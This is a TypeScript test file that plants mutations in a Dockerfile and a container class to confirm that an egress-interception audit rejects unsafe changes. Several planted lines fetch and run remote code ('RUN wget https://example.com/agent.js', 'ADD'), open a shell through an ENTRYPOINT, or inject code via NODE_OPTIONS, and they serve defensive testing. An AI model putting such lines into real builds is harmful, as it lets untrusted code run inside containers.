// Planted reds for gate:egress-interception's forwarder admission: the live CodexEgress passes, and each mutation of
// one proof keeps a container in the interception set.
import { describe, expect, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { CONTAINER_IMAGES, imageReference, readSource, sourceHash } from './container-images';
import { auditForwarder, loadForwarderSurface, surfaceOf, surfaceReasons, type ForwarderInputs, type ForwarderSurface } from './egress-interception';

const REPO = join(import.meta.dir, '..');

const FILE = 'packages/cf-backend/src/egress/codex-egress.ts';

const IMAGE = CONTAINER_IMAGES.CodexEgress;

const DOCKERFILE = `${IMAGE.source}/Dockerfile`;

const SURFACE: ForwarderSurface = await loadForwarderSurface(join(REPO, FILE), 'CodexEgress') ?? { parentIsDurableObject: false, methods: [] };

function live(): ForwarderInputs {
  return {
    owner: 'CodexEgress',
    file: FILE,
    fileText: readFileSync(join(REPO, FILE), 'utf8'),
    image: IMAGE,
    boundImage: imageReference(IMAGE),
    sourceFiles: readSource(REPO, IMAGE.source),
    surface: SURFACE,
  };
}

/** The live inputs with one source file rewritten and its hash recorded, so only the proof under test fails. */
function withFile(path: string, rewrite: (text: string) => string): ForwarderInputs {
  const files = new Map(live().sourceFiles);
  files.set(path, rewrite(String(files.get(path) ?? '')));

  return { ...live(), sourceFiles: files, image: { ...IMAGE, sourceHash: sourceHash(files) } };
}

describe('a direct Container is admitted only with all three proofs', () => {
  test('the live CodexEgress is admitted', () => {
    expect(auditForwarder(live())).toEqual([]);
  });

  test('(a) no record, a moved source, or a different bound image keeps it in the set', () => {
    expect(auditForwarder({ ...live(), image: undefined })).toHaveLength(1);

    const moved = new Map(live().sourceFiles);
    moved.set(`${IMAGE.source}/server.mjs`, `${String(moved.get(`${IMAGE.source}/server.mjs`))}\n// edited after the push\n`);
    expect(auditForwarder({ ...live(), sourceFiles: moved }).join('\n')).toContain('no longer hashes');

    expect(auditForwarder({ ...live(), boundImage: `${IMAGE.repository}@sha256:${'0'.repeat(64)}` }).join('\n')).toContain('is bound to');
  });

  test('(b) anything but FROM, COPY, WORKDIR, ENV, EXPOSE, USER, LABEL and CMD, or a foreign program, keeps it in the set', () => {
    const cases: ReadonlyArray<readonly [string, (text: string) => string]> = [
      ['uses `RUN`', (text) => text.replace('USER node', 'RUN wget https://example.com/agent.js\nUSER node')],
      ['uses `ENTRYPOINT`', (text) => text.replace(/^CMD /mu, 'ENTRYPOINT ["sh", "-c", "$CODE"]\nCMD ')],
      ['uses `ONBUILD`', (text) => text.replace('USER node', 'ONBUILD RUN wget https://example.com/agent.js\nUSER node')],
      ['uses `ADD`', (text) => text.replace('COPY server.mjs policy.mjs .', 'ADD https://example.com/agent.js .\nCOPY server.mjs policy.mjs .')],
      ['uses `RUN`', (text) => text.replace('COPY server.mjs policy.mjs .', 'COPY server.mjs policy.mjs \\\n  .\nLABEL a=b \\\nRUN=1\nRUN \\\n  wget https://example.com/x')],
      ['not a tracked file', (text) => text.replace('COPY server.mjs policy.mjs .', 'COPY server.mjs \\\n  agent.js .')],
      ['not a pinned digest', (text) => text.replace(/^FROM .*$/mu, 'FROM node:22-alpine')],
      ['not one tracked script', (text) => text.replace(/^CMD .*$/mu, 'CMD ["node", "-e", "require(process.env.CODE)"]')],
      ['sets a NODE_ variable', (text) => text.replace('USER node', 'ENV NODE_OPTIONS=--import=data:text/javascript,x\nUSER node')],
      ['names CMD twice', (text) => `${text}CMD ["node", "server.mjs"]\n`],
    ];

    for (const [reason, rewrite] of cases) {
      const rewritten = withFile(DOCKERFILE, rewrite);

      expect({ reason, changed: rewritten.sourceFiles.get(DOCKERFILE) !== live().sourceFiles.get(DOCKERFILE) }).toEqual({ reason, changed: true });
      expect({ reason, found: auditForwarder(rewritten).join('\n').includes(reason) }).toEqual({ reason, found: true });
    }
  });

  test('(c) the loaded class exposes exactly the classified surface, and a base class on it is red', () => {
    expect({ parent: SURFACE.parentIsDurableObject, methods: [...SURFACE.methods].sort() })
      .toEqual({ parent: true, methods: ['alarm', 'cancel', 'constructor', 'forward'] });

    class DurableObject {}

    class Base extends DurableObject {
      doStartContainer(): string { return 'base'; }
    }

    class Inheriting extends Base {}

    class Extra extends DurableObject {
      persistOutboundConfiguration(): string { return 'extra'; }
    }

    class Accessor extends DurableObject {
      get boot(): () => string { return () => 'box'; }
    }

    expect(surfaceReasons(surfaceOf(Inheriting, DurableObject)).join('\n')).toContain('does not extend DurableObject directly');
    expect(surfaceReasons(surfaceOf(Extra, DurableObject)).join('\n')).toContain('exposes `persistOutboundConfiguration`');
    expect(surfaceReasons(surfaceOf(Accessor, DurableObject)).join('\n')).toContain('exposes `boot`');
  });

  test('(c) the private box declares only its three fields and never leaves the class', () => {
    const text = live().fileText;

    const cases: ReadonlyArray<readonly [string, string]> = [
      ['its box declares `entrypoint`', text.replace("  enableInternet = true;\n}", "  enableInternet = true;\n\n  entrypoint = ['sh', '-c', 'id'];\n}")],
      ['its box declares `envVars`', text.replace("  enableInternet = true;\n}", "  enableInternet = true;\n\n  envVars = { NODE_OPTIONS: '--require /tmp/x' };\n}")],
      ['its box declares `start`', text.replace("  enableInternet = true;\n}", "  enableInternet = true;\n\n  override async start() { await super.start({ entrypoint: ['sh'] }); }\n}")],
      ['exports its box', text.replace('class EgressBox extends', 'export class EgressBox extends')],
      ['uses its box other than', text.replace('  cancel(callId: string): void {', '  box() { return this.#box; }\n\n  cancel(callId: string): void {')],
      ['uses its box other than', text.replace("fetch: async (signal) => box.containerFetch(", "fetch: async (signal) => box['containerFetch'](")],
      ['uses its box other than', text.replace('    this.#calls.cancel(callId);', '    this.#calls.cancel(callId);\n    void this.#box.ctx;')],
      ['uses its box other than', text.replace('    this.#calls.cancel(callId);', "    void this.#box.start({ entrypoint: ['sh'] });")],
      ['carries a decorator', text.replace('export class CodexEgress', '@withRun\nexport class CodexEgress')],
      ['declares a getter `boot`', text.replace('  cancel(callId: string): void {', '  get boot() {\n    const box = this.#box;\n\n    return (options: object) => box.start(options);\n  }\n\n  cancel(callId: string): void {')],
      ['declares a setter `port`', text.replace('  cancel(callId: string): void {', '  set port(value: number) { void value; }\n\n  cancel(callId: string): void {')],
      ['captures `this` or the box', text.replace('    this.#calls.cancel(callId);', '    this.#calls.cancel(callId);\n    const later = () => this.#box;\n    void later;')],
      ['uses its box other than', text.replace('box.startAndWaitForPorts(box.defaultPort, { abort: signal })', "box.startAndWaitForPorts(box.defaultPort, { abort: signal }, { entrypoint: ['sh'] })")],
      ['uses its box other than', text.replace('box.startAndWaitForPorts(box.defaultPort, { abort: signal })', "box.startAndWaitForPorts(box.defaultPort, { abort: signal, entrypoint: ['sh'] })")],
      ['uses its box other than', text.replace("box.containerFetch(new Request('http://codex-egress/forward', {", "box.containerFetch(request, 22, new Request('http://codex-egress/forward', {")],
      ['uses its box other than', text.replace('    await this.#box.alarm(alarmInfo);', "    await this.#box.alarm({ retryCount: 0, isRetry: false });")],
    ];

    for (const [reason, planted] of cases) {
      expect({ reason, changed: planted !== text }).toEqual({ reason, changed: true });
      const found = auditForwarder({ ...live(), fileText: planted }).join('\n');

      expect({ reason, found: found.includes(reason) }).toEqual({ reason, found: true });
    }
  });
});
